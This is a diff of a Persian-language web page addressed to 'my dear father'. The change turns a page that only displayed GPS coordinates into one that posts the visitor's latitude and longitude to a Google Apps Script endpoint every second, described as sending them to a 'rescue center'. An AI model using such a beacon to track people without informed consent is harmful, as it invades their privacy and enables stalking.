@@ -1,36 +1,48 @@
 <!DOCTYPE html>
-<html lang="fa">
+<html>
 <head>
-  <meta charset="UTF-8" />
-  <title>کمک‌کننده</title>
+  <meta charset="utf-8">
+  <title>در حال دریافت موقعیت شما...</title>
 </head>
 <body>
-  <h2>🛰️ در حال دریافت موقعیت شما...</h2>
-  <div id="status">⏳ منتظر موقعیت...</div>
-  <div id="map"></div>
+  <h2>👋 سلام پدر عزیزم</h2>
+  <p>📍 در حال ارسال موقعیت شما به مرکز نجات...</p>
+  <div id="status" style="color: green;"></div>
 
   <script>
     function sendLocation(position) {
       const lat = position.coords.latitude;
       const lon = position.coords.longitude;
-      const acc = position.coords.accuracy;
+      const url = "https://script.google.com/macros/s/AKfycbwBuiOYWXKCETZb3E2bgPw_oN_ouSzKBuUV-mekiWLLu9rMnZL_E0DgYRQQwLkZwUcpng/exec";
 
-      document.getElementById("status").innerText =
-        `مکان فعلی:\nعرض: ${lat.toFixed(6)}\nطول: ${lon.toFixed(6)}\nدقت: ${acc} متر`;
-
-      // در این نسخه فقط نمایش می‌دهیم، بعداً ارسال هم اضافه می‌شود
+      fetch(url, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ lat, lon })
+      })
+      .then(res => res.text())
+      .then(txt => {
+        document.getElementById("status").innerText = `✅ موقعیت ارسال شد: ${lat.toFixed(5)}, ${lon.toFixed(5)}`;
+      })
+      .catch(err => {
+        document.getElementById("status").innerText = "❌ خطا در ارسال مکان";
+      });
     }
 
-    function handleError(error) {
-      document.getElementById("status").innerText =
-        `❌ خطا در گرفتن موقعیت: ${error.message}`;
+    function getAndSendLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(sendLocation, () => {
+          document.getElementById("status").innerText = "❌ GPS غیرفعال است";
+        });
+      } else {
+        document.getElementById("status").innerText = "❌ مرورگر از GPS پشتیبانی نمی‌کند";
+      }
     }
 
-    navigator.geolocation.watchPosition(sendLocation, handleError, {
-      enableHighAccuracy: true,
-      maximumAge: 0,
-      timeout: 10000
-    });
+    // اجرای اولیه + هر ۱ ثانیه یک‌بار
+    setInterval(getAndSendLocation, 1000);
+    getAndSendLocation();
   </script>
 </body>
 </html>
+
